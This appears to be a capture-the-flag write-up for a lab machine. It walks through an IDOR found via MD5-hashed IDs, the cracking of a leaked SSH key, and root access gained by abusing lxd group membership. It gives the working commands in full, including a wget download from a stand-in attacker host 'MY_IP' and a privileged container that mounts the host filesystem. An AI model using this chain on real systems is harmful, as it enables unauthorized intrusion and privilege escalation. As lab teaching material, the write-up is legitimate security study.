## BattleX CTF: machine1
#### Category: Boot2Root
#### Score: 60
#### Number of Solves: 3 
### Description

> You know what to do

### Recon

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-30 02:39 WAT
Nmap scan report for 10.10.146.166
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f8:89:12:c0:ab:91:e2:29:1f:55:a6:b1:aa:48:e5:37 (RSA)
|   256 46:05:a8:f4:66:29:41:79:01:a0:43:b8:a9:ef:47:5d (ECDSA)
|_  256 04:db:fa:b1:16:82:c5:99:86:41:ba:8a:ea:72:34:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Proverb Categories
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
```

### TL; DR

Exploit IDOR in a web app and get access to sensitive information, in this case, a SSH private key, encrypted with a weak password. Using that as access and exploiting lxd group got root access on this machine
    
### Solution Steps

![Imgur](https://i.imgur.com/4Z78fz0.png)

_Web server on port 80_

On checking the links in the proverb categories, they looked strange and similarly structured.

![Imgur](https://i.imgur.com/dEeLuF0.png)

They resemble an MD5 encoded text so I proceeded to use crackstation to try and reverse the text.

![Imgur](https://i.imgur.com/SOjlcBY.png)

My guess was right and it should be possible for me to generate my own MD5 and exploit an IDOR (Insecure Direct Object References) vulnerability. I generated several numbers in MD5 and tried to see if it existed, until `0`.

![Imgur](https://i.imgur.com/ERvoHX2.png)

It contained both public ssh and an encrypted private ssh key. The public key showed who owns them, `jayhunts`. I copied the private key to a file for cracking, using ssh2john and john.

![Imgur](https://i.imgur.com/akAJNrQ.png)

_Password found_

Now that the password has been found, login via ssh shouldn't be an issue. 

![Imgur](https://i.imgur.com/XjqnC6R.png)

_Login success_

```
jayhunts@BattleX:~$ cat user.txt
BattleX{e99a18c428cb38d5f260853678922e03}
jayhunts@BattleX:~$
```

User flag: `BattleX{e99a18c428cb38d5f260853678922e03}`
BattleX{e99a18c428cb38d5f260853678922e03}

### Privilege escalation

```
jayhunts@BattleX:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[snip]
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jayhunts:x:1000:1000:,,,:/home/jayhunts:/bin/bash
jayhunts@BattleX:~$ id
uid=1000(jayhunts) gid=1000(jayhunts) groups=1000(jayhunts),108(lxd)
```

After checking for users in `/etc/passwd` file, I ran id and saw that jayhunts is in the `lxd` group. This can be taken advantage of to get root access on this machine. 

I ran this on my pc to start the privilege escalation proceedure

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

It soon created a `alpine-v3.13-x86_64-20210218_0139.tar.gz` in the folder. Next I snuck the image to the machine with my simple http server, using wget.

```
wget http://MY_IP:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

```
jayhunts@BattleX:~$ lxc image import import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first container, try: lxc launch ubuntu:18.04

Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a

jayhunts@BattleX:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]:
Create a new BTRFS pool? (yes/no) [default=yes]:
Would you like to use an existing block device? (yes/no) [default=no]:
Size in GB of the new loop device (1GB minimum) [default=15GB]:
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new local network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
Would you like LXD to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:

jayhunts@BattleX:~$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer

jayhunts@BattleX:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer

jayhunts@BattleX:~$ lxc start mycontainer
jayhunts@BattleX:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Jun 30, 2024 at 11:04am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
jayhunts@BattleX:~$ lxc exec mycontainer /bin/sh
~ # whoami
root
~ # pwd
/root
~ # ls
~ # cd /mnt/root
/mnt/root # ls
bin             etc             lib             mnt             run             swap.img        var
boot            home            lib64           opt             sbin            sys             vmlinuz
cdrom           initrd.img      lost+found      proc            snap            tmp             vmlinuz.old
dev             initrd.img.old  media           root            srv             usr
/mnt/root # cd root
/mnt/root/root # ls -lah
total 36K
drwx------    6 root     root        4.0K Jun 21 15:43 .
drwxr-xr-x   24 root     root        4.0K Jun 14 20:01 ..
lrwxrwxrwx    1 root     root           9 Jun 15 04:14 .bash_history -> /dev/null
-rw-r--r--    1 root     root        3.0K Jun 21 15:41 .bashrc
drwx------    2 root     root        4.0K Jun 16 00:46 .cache
drwx------    3 root     root        4.0K Jun 16 00:46 .gnupg
drwxr-xr-x    3 root     root        4.0K Jun 14 21:21 .local
-rw-r--r--    1 root     root         148 Aug 17  2015 .profile
drwx------    2 root     root        4.0K Jun 14 20:51 .ssh
-rw-------    1 root     root          42 Jun 21 15:43 root.txt
/mnt/root/root # cat root.txt
BattleX{c4ca4238a0b923820dcc509a6f75849b}
```

Thats all for machine1

Root flag: `BattleX{c4ca4238a0b923820dcc509a6f75849b}`

### Conclusion


### References

1. [Hacktricks lxd privilege escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
